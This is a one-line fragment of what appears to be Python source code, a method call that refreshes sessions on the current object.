             self.refresh_sessions()
